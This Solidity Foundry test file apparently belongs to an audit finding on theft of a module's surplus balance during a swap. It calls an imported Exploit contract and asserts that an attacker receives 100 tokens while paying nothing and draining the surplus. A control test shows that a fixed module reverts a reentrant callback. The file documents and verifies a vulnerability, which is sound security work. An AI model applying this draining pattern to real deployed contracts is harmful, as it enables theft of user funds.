// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token0, Token1, Pool, ModuleFixed} from
    "./56683-vlts3-13-direct-theft-of-surplus-balance-when-unstaking-sthy.sol";

contract Payer {
    function pay(Pool pool, uint256 amount) external {
        pool.swap(amount, false);
    }
}

contract CallbackAttacker {
    ModuleFixed internal module;

    constructor(ModuleFixed _module) {
        module = _module;
    }

    function onSwap(uint256) external {
        module.update();
    }

    function go(Pool pool) external {
        pool.swap(100 ether, true);
    }
}

contract Finding56683Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_surplus_pays_for_the_swap() public {
        vm.deal(address(this), 100 ether);
        Exploit e = new Exploit();
        e.run{value: 100 ether}();
        assertEq(e.token0().balanceOf(ATTACKER), 100 ether, "stole 100 token0");
        assertEq(e.token1().balanceOf(ATTACKER), 0, "paid no token1");
        assertEq(address(e.module()).balance, 0, "surplus gone");
    }

    function test_control_swap_cannot_spend_the_surplus() public {
        vm.deal(address(this), 200 ether);
        Token0 token0 = new Token0();
        Token1 token1 = new Token1();
        Pool pool = new Pool(token0, token1);
        token0.mint(address(pool), 100 ether);
        ModuleFixed module = new ModuleFixed(pool, token1);
        (bool ok,) = address(module).call{value: 100 ether}("");
        assertTrue(ok, "funded");
        CallbackAttacker attacker = new CallbackAttacker(module);
        vm.expectRevert(bytes("in swap"));
        attacker.go(pool);
        assertEq(address(module).balance, 100 ether, "surplus stays");

        token1.deposit{value: 100 ether}();
        Payer payer = new Payer();
        token1.transfer(address(payer), 100 ether);
        payer.pay(pool, 100 ether);
        assertEq(token0.balanceOf(address(payer)), 100 ether, "paid 100 token1 for 100 token0");
        assertEq(address(module).balance, 100 ether, "surplus still in the module");
    }
}
